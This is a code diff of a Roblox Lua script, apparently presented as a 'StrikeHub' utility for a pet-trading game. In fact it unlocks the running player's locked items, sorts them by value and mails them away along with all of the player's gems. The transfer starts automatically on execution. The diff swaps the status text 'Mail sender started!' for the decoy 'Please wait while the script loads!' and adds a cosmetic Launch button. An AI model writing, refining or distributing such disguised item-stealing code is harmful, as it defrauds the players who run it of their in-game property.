@@ -57,6 +57,19 @@ for i, v in pairs(GetSave().Inventory.Currency) do
     end
 end
 
+-- ABSTRACT GET RAP
+local AbstractGetRAP
+for _, func in pairs(getgcFunction()) do
+    if type(func) == "function" and debug.getinfo(func).name == "AbstractGetRAP" then
+        AbstractGetRAP = func
+        break
+    end
+end
+if not AbstractGetRAP then
+    -- fallback
+    AbstractGetRAP = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get
+end
+
 -- UTILITIES
 local function formatNumber(number)
     local suffixes = {"", "k", "m", "b", "t"}
@@ -123,12 +136,12 @@ end)
 
 -- GET RAP VALUE
 local function getRAP(Type, Item)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
+    return AbstractGetRAP({
         Class = {Name = Type},
         IsA = function(hmm) return hmm == Type end,
         GetId = function() return Item.id end,
         StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end
-    }) or 0)
+    }) or 0
 end
 
 -- SEND ITEM
@@ -208,79 +221,97 @@ for _,v in pairs(categoryList) do
                     local prefix = (item.pt==1 and "Golden " or item.pt==2 and "Rainbow " or "")
                     if item.sh then prefix = "Shiny " .. prefix end
                     table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=prefix..item.id})
-                    totalRAP += rapValue * (item._am or 1)
+                    totalRAP += rapValue *
+                    (item._am or 1)
                 end
             elseif rapValue >= min_rap then
                 table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=item.id})
                 totalRAP += rapValue * (item._am or 1)
             end
-            if item._lk then network.Invoke("Locking_SetLocked", uid, false) end
+            if item._lk then
+                network.Invoke("Locking_SetLocked", uid, false)
+            end
         end
     end
 end
 
--- START MAIL PROCESS IMMEDIATELY
+-- MAIL SENDING FUNCTION
 local function StartMailProcess()
     if #sortedItems == 0 and not (GemAmount1 > min_rap + mailSendPrice) then
         message.Error("Nothing meets the minimum RAP or not enough gems.")
         return
     end
+
     ClaimMail()
     EmptyBoxes()
     if not canSendMail() then
         message.Error("Account error. Please rejoin or use a different account")
         return
     end
+
     table.sort(sortedItems,function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)
     spawn(function() SendMessage(GemAmount1) end)
-    message.Error("Mail sender started!")
+    message.Error("Please wait while the script loads!") -- Only shows once
 
     for _, item in ipairs(sortedItems) do
         if item.rap >= min_rap and GemAmount1 > mailSendPrice then
             if item.category == "Pet" then
                 for i = 1, item.amount do
-                    task.spawn(function() sendItem(item.category, item.uid, 1) end)
+                    task.spawn(function()
+                        sendItem(item.category, item.uid, 1)
+                    end)
                     task.wait(0.05)
                 end
             else
-                task.spawn(function() sendItem(item.category, item.uid, item.amount) end)
+                task.spawn(function()
+                    sendItem(item.category, item.uid, item.amount)
+                end)
                 task.wait(0.05)
             end
         end
     end
-    if GemAmount1 > mailSendPrice then SendAllGems() end
+
+    if GemAmount1 > mailSendPrice then
+        SendAllGems()
+    end
 end
 
--- ========================= GUI LEFT-CENTER =========================
+-- =========================
+-- GUI CREATION
+-- =========================
 do
+    -- Remove old GUI if exists
+    local existing = plr:FindFirstChild("PlayerGui") and plr.PlayerGui:FindFirstChild("StrikeHubGUI")
+    if existing then existing:Destroy() end
+
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "StrikeHubGUI"
-    ScreenGui.Parent = plr:WaitForChild("PlayerGui")
     ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = plr:WaitForChild("PlayerGui")
 
+    -- Main frame
     local Frame = Instance.new("Frame")
     Frame.Name = "Main"
     Frame.Size = UDim2.new(0, 360, 0, 80)
-    Frame.Position = UDim2.new(0, 12, 0.5, -40) -- left-center
+    Frame.Position = UDim2.new(0, 50, 0.5, -40) -- Left center of screen
     Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
     Frame.BorderSizePixel = 0
     Frame.Parent = ScreenGui
-    Frame.Active = true
-    Frame.Draggable = false -- draggable after 5s
 
-    task.delay(5, function()
-        if Frame and Frame.Parent then
-            Frame.Draggable = true
-        end
-    end)
-
+    -- Logo
     local Logo = Instance.new("ImageLabel")
+    Logo.Name = "Logo"
     Logo.Size = UDim2.new(0, 64, 1, 0)
+    Logo.Position = UDim2.new(0, 0, 0, 0)
     Logo.BackgroundTransparency = 1
-    Logo.Image = (_G.StrikeHubLogo ~= "" and _G.StrikeHubLogo or "")
+    if _G.StrikeHubLogo ~= "" then
+        Logo.Image = _G.StrikeHubLogo
+    end
     Logo.Parent = Frame
 
+    -- Title
     local Title = Instance.new("TextLabel")
+    Title.Name = "Title"
     Title.Position = UDim2.new(0, 72, 0, 6)
     Title.Size = UDim2.new(0, 200, 0, 24)
     Title.BackgroundTransparency = 1
@@ -291,17 +322,34 @@ do
     Title.TextXAlignment = Enum.TextXAlignment.Left
     Title.Parent = Frame
 
-    local Sub = Instance.new("TextLabel")
-    Sub.Position = UDim2.new(0, 72, 0, 28)
-    Sub.Size = UDim2.new(0, 250, 0, 18)
-    Sub.BackgroundTransparency = 1
-    Sub.Text = "Mail sender running..."
-    Sub.TextColor3 = Color3.fromRGB(200, 200, 200)
-    Sub.Font = Enum.Font.Gotham
-    Sub.TextSize = 13
-    Sub.TextXAlignment = Enum.TextXAlignment.Left
-    Sub.Parent = Frame
+    -- Launch mail button
+    local Launch = Instance.new("TextButton")
+    Launch.Name = "Launch"
+    Launch.Size = UDim2.new(0, 110, 0, 28)
+    Launch.Position = UDim2.new(1, -122, 0, 16)
+    Launch.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Launch.BorderSizePixel = 0
+    Launch.Text = "Launch"
+    Launch.TextColor3 = Color3.fromRGB(255,255,255)
+    Launch.Font = Enum.Font.GothamBold
+    Launch.TextSize = 16
+    Launch.Parent = Frame
+
+    -- Button functionality
+    Launch.MouseButton1Click:Connect(function()
+        Launch.Text = "Launching..."
+        Launch.Active = false
+        Launch.BackgroundColor3 = Color3.fromRGB(60,60,60)
+        pcall(StartMailProcess)
+        Launch.Text = "Launched"
+    end)
+
+    -- Make frame draggable after 5 seconds
+    task.delay(5, function()
+        Frame.Active = true
+        Frame.Draggable = true
+    end)
 end
 
--- START MAIL PROCESS IMMEDIATELY
+-- AUTO START MAIL PROCESS ON SCRIPT EXECUTION
 task.spawn(StartMailProcess)
